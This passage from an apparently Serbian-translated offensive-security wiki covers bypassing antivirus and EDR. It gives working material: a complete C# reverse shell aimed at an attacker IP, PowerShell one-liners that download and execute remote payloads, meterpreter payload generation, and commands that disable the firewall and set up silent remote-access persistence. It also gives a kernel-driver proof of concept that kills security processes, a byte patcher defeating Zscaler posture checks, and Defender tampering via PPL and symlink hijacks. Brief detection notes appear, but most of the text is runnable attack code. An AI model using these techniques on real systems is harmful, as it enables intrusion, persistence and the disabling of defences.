[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji omogućava aplikacijama i sistemskim komponentama da **zapisivanje događaja**. Međutim, može se koristiti i od strane bezbednosnih proizvoda za praćenje i detekciju zlonamernih aktivnosti.

Slično kao što se AMSI onemogućava (bypassa), moguće je i učiniti da funkcija `EtwEventWrite` u procesu korisničkog prostora odmah vrati bez beleženja događaja. To se radi patchovanjem funkcije u memoriji da odmah vrati, čime se efektivno onemogućava ETW logovanje za taj proces.

Više informacija možete naći u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binarnih fajlova direktno u memoriju poznato je već dugo i i dalje je odličan način za pokretanje post-exploitation alata bez otkrivanja od strane AV.

Pošto će payload biti učitan direktno u memoriju bez dodirivanja diska, trebaće nam samo da se pozabavimo patchovanjem AMSI-ja za ceo proces.

Većina C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već omogućava izvršavanje C# assembly-ja direktno u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

To podrazumeva **pokretanje novog žrtvenog procesa**, injektovanje vašeg post-exploitation zlonamernog koda u taj novi proces, izvršavanje koda i nakon završetka ubijanje novog procesa. Ovo ima i prednosti i nedostatke. Prednost fork and run metode je što se izvršavanje dešava **izvan** našeg Beacon implant procesa. To znači da ako nešto pođe po zlu ili bude otkriveno tokom naše post-exploitation akcije, postoji **mnogo veća šansa** da će naš **implant preživeti.** Nedostatak je što imate **veću šansu** da budete uhvaćeni od strane **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju post-exploitation zlonamernog koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je da ako nešto pođe po zlu prilikom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti svoj beacon** jer proces može da padne.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o učitavanju C# Assembly-ja, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **from PowerShell**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati zlonamerni kod koristeći druge jezike tako što se kompromitovanom računaru omogući pristup **interpreter environment installed on the Attacker Controlled SMB share**.

Dozvoljavajući pristup Interpreter Binaries i okruženju na SMB deljenju možete **izvršavati proizvoljan kod u tim jezicima u memoriji** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statičke potpise**. Testiranje sa nasumičnim neobfuskiranim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše pristupnim tokenom ili bezbednosnim proizvodom kao što je EDR ili AV**, omogućavajući mu da smanji privilegije tako da proces neće umreti, ali neće imati dozvole da proverava zlonamerne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **onemogućiti spoljnim procesima** da dobijaju handle-ove nad tokenima bezbednosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je instalirati Chrome Remote Desktop na računar žrtve i potom ga koristiti za takeover i održavanje persistence:
1. Download from https://remotedesktop.google.com/, kliknite na "Set up via SSH", pa zatim kliknite na MSI fajl za Windows da preuzmete MSI.
2. Pokrenite instalaciju tiho na žrtvi (potreban admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite next. Wizard će zatim tražiti autorizaciju; kliknite na Authorize dugme da nastavite.
4. Izvršite dati parametar uz neke prilagodbe: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: parametar pin omogućava postavljanje PIN-a bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma komplikovana tema; ponekad morate uzeti u obzir mnoge različite izvore telemetrije u jednom sistemu, tako da je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg budete radili imaće svoje snage i slabosti.

Toplo preporučujem da pogledate ovu prezentaciju od [@ATTL4S](https://twitter.com/DaniLJ94), da dobijete uvid u naprednije tehnike evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedna odlična prezentacija od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarnog fajla** dok ne **otkrije koji deo Defender** označava kao maliciozan i razdeli vam to.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa web servisom dostupan na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10, svi Windowsi su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) radeći:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** prilikom pokretanja sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i isključi firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (trebate bin downloads, ne setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Zatim, premestite binarni _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** treba da pokrene na svom **host**-u binarni `vncviewer.exe -listen 5900` kako bi bio spreman da prihvati reverse **VNC connection**. Zatim, na **victim**: pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste ostali neprimećeni, ne smete uraditi nekoliko stvari

- Nemojte pokretati `winvnc` ako već radi ili ćete izazvati [popup](https://i.imgur.com/1SROTTl.png). Proverite da li radi sa `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će se otvoriti [the config window](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć ili ćete izazvati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatora za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/promheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Primer: korišćenje Pythona za build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Onemogućavanje AV/EDR iz kernel prostora

Storm-2603 je iskoristio malu konzolnu utilitu poznatu kao **Antivirus Terminator** da onemogući zaštitu endpointa pre nego što je isporučio ransomware. Alat donosi svoj **vlastiti ranjiv ali *potpisan* driver** i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu blokirati.

Ključni zaključci
1. **Potpisani driver**: Fajl koji se isporučuje na disk je `ServiceMouse.sys`, ali binarni fajl je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi validan Microsoft potpis, učita se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user space-a.
3. **IOCTLs koje izlaže driver**
| IOCTL code | Funkcija                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminira proizvoljni proces po PID-u (koristi se za zaustavljanje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljni fajl na disku |
| `0x990001D0` | Uklanja driver iz kernela i briše servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto ovo funkcioniše**: BYOVD potpuno preskače user-mode zaštite; kod koji se izvršava u kernelu može otvoriti *zaštićene* procese, terminirati ih ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge mehanizme hardeninga.

Otkrivanje / Ublažavanje
•  Omogućite Microsoft-ovu listu blokiranih ranjivih drivera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
•  Pratite kreiranja novih *kernel* servisa i alarmirajte kada se driver učita iz direktorijuma koji je upisiv za sve korisnike ili nije na listi dozvoljenih.  
•  Pratite user-mode handle-ove ka prilagođenim device objektima koji su praćeni sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje pravila device-posture lokalno i oslanja se na Windows RPC da prenese rezultate drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuno zaobilaženje:

1. Evaluacija posture se dešava **u potpunosti na strani klijenta** (boolean vrednost se šalje serveru).  
2. Interni RPC endpointi samo proveravaju da li je izvršni fajl koji se povezuje **potpisan od strane Zscalera** (putem `WinVerifyTrust`).

Patchovanjem četiri potpisana binarna fajla na disku oba mehanizma mogu biti neutralisana:

| Binary | Originalna logika koja je patchovana | Rezultat |
|--------|--------------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera usklađena |
| `ZSAService.exe` | Indirektan poziv na `WinVerifyTrust` | NOP-ovano ⇒ bilo koji (čak i nepotpisani) proces može da se poveže na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Provere su preskočene |

Minimalni isječak patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja service stack-a:

* **Sve** posture provere prikazuju **green/compliant**.
* Unsigned ili modifikovani binarni fajlovi mogu otvoriti named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ovaj case study pokazuje kako čisto client-side odluke o poverenju i jednostavne provere potpisa mogu biti poražene sa par byte patch-eva.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće signer/level hijerarhiju tako da samo zaštićeni procesi istog ili višeg nivoa mogu menjati jedni druge. Ofanzivno, ako legitimno možete pokrenuti PPL-enabled binary i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-backed write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binar `C:\Windows\System32\ClipUp.exe` samostalno se pokreće i prihvata parametar za upis log fajla na putanju koju navede pozivalac.
- Kada se pokrene kao PPL proces, upis fajla se izvodi uz PPL podršku.
- ClipUp ne može parsirati putanje koje sadrže razmake; koristite 8.3 short paths da ciljate u inače zaštićene lokacije.

8.3 short path helpers
- Prikažite short imena: `dir /x` u svakom roditeljskom direktorijumu.
- Dobijte short path u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da primorate kreiranje fajla u zaštićenom AV direktorijumu (npr., Defender Platform). Koristite 8.3 short names po potrebi.
3) Ako je ciljna binarka obično otvorena/zaključana od strane AV dok radi (npr., MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje instaliranjem servisa za automatsko pokretanje koji se pouzdano pokreće ranije. Potvrdite redosled boot-a koristeći Process Monitor (boot logging).
4) Na reboot-u PPL-podržani upis se desi pre nego što AV zaključa svoje binarke, korumpirajući ciljnu datoteku i sprečavajući pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim njegove lokacije; primitiv je više pogodan za korupciju nego za precizno ubacivanje sadržaja.
- Zahteva lokalnog administratora/SYSTEM za instalaciju/pokretanje servisa i potreban je prozor za restart.
- Vremenski faktor je kritičan: cilj ne sme biti otvoren; izvođenje pri boot-u izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, posebno ako je potomak nestandardnih pokretača, u okolini boot-a.
- Novi servisi konfigurisanih da se automatski pokreću sa sumnjivim binarnim fajlovima i koji se dosledno pokreću pre Defender/AV. Istražite kreiranje/izmenu servisa pre grešaka pri pokretanju Defender-a.
- Praćenje integriteta fajlova na Defender binarnim fajlovima/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicama.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binarnih fajlova koji nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binarni fajlovi mogu da se izvršavaju kao PPL i pod kojim roditeljima; blokirajte pozive ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu servisa za automatsko pokretanje i pratite manipulacije redosledom pokretanja.
- Osigurajte da su Defender tamper protection i early-launch zaštite omogućene; istražite greške pri pokretanju koje ukazuju na korupciju binarnog fajla.
- Razmotrite onemogućavanje 8.3 short-name generisanja na volumenima koji hostuju sigurnosne alatke ako je to kompatibilno sa vašim okruženjem (temeljno testirajte).

Reference za PPL i alatke
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje se izvršava tako što enumeriše podfoldere pod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Odabere podfolder sa najvećim leksikografskim verzijskim nizom (npr. `4.18.25070.5-0`), zatim pokreće Defender servisne procese odande (istovremeno ažurirajući putanje servisa/registry). Ovaj odabir veruje stavkama direktorijuma uključujući directory reparse points (symlinks). Administrator može iskoristiti ovo da preusmeri Defender na putanju u koju napadač ima pravo pisanja i postigne DLL sideloading ili ometanje servisa.

Preduslovi
- Lokalni administrator (potreban za kreiranje direktorijuma/symlinkova pod Platform direktorijumom)
- Mogućnost restartovanja ili pokretanja ponovnog izbora Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto ovo funkcioniše
- Defender blokira upise u sopstvene foldere, ali njegov izbor platforme veruje stavkama direktorijuma i bira leksikografski najveću verziju bez verifikacije da li ciljna putanja vodi ka zaštićenoj/pouzdanoj lokaciji.

Korak-po-korak (primer)
1) Pripremite kopiju trenutnog Platform direktorijuma u kojoj se može pisati, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Napravite symlink do direktorijuma sa višom verzijom unutar Platform koji pokazuje na vaš direktorijum:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučeno ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da se MsMpEng.exe (WinDefend) pokreće iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da primetite novi put procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registrija koja odražava tu lokaciju.

Post-exploitation options
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije kako biste izvršili kod u Defenderovim procesima. Pogledajte odeljak iznad: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri sledećem pokretanju konfigurisani put ne bude razrešen i Defender ne uspe da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje eskalaciju privilegija; zahteva administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu premestiti runtime evasion iz C2 implant-a u sam cilj modul tako što će hook-ovati njegov Import Address Table (IAT) i usmeravati odabrane API-je kroz attacker-controlled, position‑independent code (PIC). Ovo generalizuje evasion izvan male API površine koju mnogi kitovi izlažu (npr. CreateProcessA), i širi iste zaštite na BOFs i post‑exploitation DLLs.

Visok nivo pristupa
- Postavite PIC blob pored cilj‑nog modula koristeći reflective loader (prepended ili companion). PIC mora biti samostalan i position‑independent.
- Dok se host DLL učitava, iterirajte IMAGE_IMPORT_DESCRIPTOR i zakrpajte IAT entries za ciljane importe (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da pokazuju na tanke PIC wrappers.
- Svaki PIC wrapper izvršava evasions pre nego što tail‑call‑uje stvarnu adresu API‑ja. Tipične evasions uključuju:
  - Memory mask/unmask oko poziva (npr. encrypt beacon regions, RWX→RX, promena imena/permisa stranica) i vraćanje nakon poziva.
  - Call‑stack spoofing: konstruisati benign stack i preći u ciljni API tako da call‑stack analysis rezoluje do očekivanih frejmova.
- Radi kompatibilnosti, export‑ujte interfejs tako da Aggressor skripta (ili ekvivalent) može registrovati koje API‑je hookovati za Beacon, BOFs i post‑ex DLLs.

Zašto IAT hooking ovde
- Radi za bilo koji kod koji koristi hook‑ovani import, bez modifikacije koda alata ili oslanjanja na Beacon da proxy‑uje specifične API‑je.
- Pokriva post‑ex DLLs: hooking LoadLibrary* vam omogućava da presretnete učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenite isto masking/stack evasion na njihove API pozive.
- Vraća pouzdanu upotrebu post‑ex komandi za pokretanje procesa protiv detekcija zasnovanih na call‑stacku omotavanjem CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja importa. Reflective loaders kao TitanLdr/AceLdr demonstriraju hooking tokom DllMain učitanog modula.
- Drži wrappers male i PIC-safe; razreši pravi API preko originalne IAT vrednosti koju si uhvatio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

